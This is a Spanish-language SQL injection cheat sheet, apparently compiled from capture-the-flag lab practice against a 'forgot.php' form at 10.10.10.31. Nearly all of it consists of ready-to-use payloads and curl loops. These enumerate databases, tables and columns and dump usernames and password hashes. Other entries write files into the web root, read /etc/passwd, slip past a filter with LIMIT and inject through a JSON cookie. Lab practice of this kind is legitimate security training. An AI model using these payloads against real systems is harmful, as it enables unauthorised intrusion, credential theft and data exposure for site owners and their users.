
![[2801146.png]]

> SQLI BASED ON ERROR
##### CHECK COLUMNS
```SQL
'order by 6-- - 
```

##### CHECK EDITABLE COLUMNS
```SQL
 'union select 1,2,3,4,5,6-- -
```

##### BASIC ENUM
```SQL
' union select 1,2,database(),user(),version(),6-- -
```

##### ENUM DATABASES
```SQL
' union select 1,2,3,4,5,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata-- -
```

##### ENUM TABLES FROM DATABASE
```SQL
' union select 1,2,table_name,4,5,6 from information_schema.tables where table_schema="warehouse"-- -
```

##### ENUM COLUMNS FROM TABLES
```SQL
' union select 1,2,column_name,4,5,6 from information_schema.columns where table_schema="mysql" and table_name="user"-- -
```

##### ENUM CONTENT FROM COLUMNS
```SQL
' union select 1,2,group_concat(User,0x3a,Password),4,5,6 from mysql.user-- -
```




> CAPACIDADES DE ESCRITURA Y LECTURA CON SQLI
##### ESCRITURA.
```sql
' union select 1,"testing",3,4,5,6 into outfile "/var/www/html/test.txt"-- -
```

##### LECTURA
```r
' union select 1,load_file("/etc/passwd"),3,4,5,6-- -
```




> WAF
##### BYPASS DEL WAF CON LIMIT
```SQL
Normal sqli --> admin@admin.com' or 1=1-- -
Problema con el output --> admin@admin.com' or 1=1 limit 0,1-- -
```


##### BUCLE CON LINUX PARA EL LIMIT ENUMERAR USUARIOS
```shell
❯ for i in $(seq 0 300); do curl -s -X POST "http://10.10.10.31/cmsdata/forgot.php" --data-urlencode "email=test@test.com' or 1=1 limit $i,1-- -" | grep "<h2>" | sed 's/<h2>//'; done | grep -v "test"
```


##### ORDER BY
```shell
#INJECCIÓN QUE NO FUNCIONA
❯ curl -s -X POST "http://10.10.10.31/cmsdata/forgot.php" --data-urlencode "email=test@test.com' order by 5-- -" | grep "<h2>" | sed 's/<h2>//'

#INJECCIÓN QUE FUNCIONA
❯ curl -s -X POST "http://10.10.10.31/cmsdata/forgot.php" --data-urlencode "email=test@test.com' order by 4-- -" | grep "<h2>" | sed 's/<h2>//'  
```


##### UNION SELECT
```shell
#INJECCIÓN FALLIDA
❯ curl -s -X POST "http://10.10.10.31/cmsdata/forgot.php" --data-urlencode "email=test@test.com' uNioN select 1,2,3,4-- -" | grep "<h2>" | sed 's/<h2>//'


#INJECCIÓN FUNCIONAL
❯ curl -s -X POST "http://10.10.10.31/cmsdata/forgot.php" --data-urlencode "email=test@test.com' uNioN select 1,2,3,\"ejemplo@ejemplo.com\"-- -" | grep "<h2>" | sed 's/<h2>//'

#OTRA INJECCIÓN FUNCIONAL
❯ curl -s -X POST "http://10.10.10.31/cmsdata/forgot.php" --data-urlencode "email=test@test.com' uNioN select 1,database(),3,\"ejemplo@ejemplo.com\"-- -" | grep "<h2>" | sed 's/<h2>//'
```

##### ENUMRAR TODAS LAS BASES DE DATOS EXISTENTES
```shell
❯ curl -s -X POST "http://10.10.10.31/cmsdata/forgot.php" --data-urlencode "email=test@test.com' uNioN select 1,group_concat(table_name),3,\"ejemplo@ejemplo.com\" from information_schema.tables where table_schema=\"supercms\"-- -" | grep "<h2>" | sed 's/<h2>//'
```


##### ENUMERAR TODAS LAS TABLAS DE UNA BASE DE DATOS
```shell
❯ curl -s -X POST "http://10.10.10.31/cmsdata/forgot.php" --data-urlencode "email=test@test.com' uNioN select 1,group_concat(table_name),3,\"ejemplo@ejemplo.com\" from information_schema.tables where table_schema=\"supercms\"-- -" | grep "<h2>" | sed 's/<h2>//'
```


##### ENUMRAR TODAS LAS COLUMNAS DE UNA TABLA
```shell
❯ curl -s -X POST "http://10.10.10.31/cmsdata/forgot.php" --data-urlencode "email=test@test.com' uNioN select 1,group_concat(column_name),3,\"ejemplo@ejemplo.com\" from information_schema.columns where table_schema=\"supercms\" and table_name=\"operators\"-- -" | grep "<h2>" | sed 's/<h2>//'
```


##### EXTRAER TODO EL CONTENIDO DE LAS COLUMNAS DESEADAS
```shell
❯ curl -s -X POST "http://10.10.10.31/cmsdata/forgot.php" --data-urlencode "email=test@test.com' uNioN select 1,group_concat(__username_,0x3a,__password_,0x3a,email),3,\"ejemplo@ejemplo.com\" from supercms.operators-- -" | grep "<h2>" | sed 's/<h2>//'
```


##### FILTRAR POR LOS QUE NO EMPIEZAN POR t
```shell
❯ curl -s -X POST "http://10.10.10.31/cmsdata/forgot.php" --data-urlencode "email=test@test.com' uNioN select 1,group_concat(__username_,0x3a,__password_,0x3a,email),3,\"ejemplo@ejemplo.com\" from supercms.operators where __username_ not like 't%'-- -" | grep "<h2>" | sed 's/<h2>//'
```




> SQLI EN COOKIE
##### COOKIE NORMAL
```JSON
{"CRAAFTKP":"1", "7DA8SKYP": "1"} 
```

##### UNION SELECT
```json
{"CRAAFTKP'UNION SELECT 1#":"1"}

{"CRAAFTKP' UNION SELECT 1,2#":"1"}
```

##### LIMIT
```json
{"CRAAFTKP' UNION SELECT 1,2,3 LIMIT 1,1#":"1"}
```

##### VERSION
```json
{"CRAAFTKP' UNION SELECT 1,version(),3 limit 1,1#":"2"}
```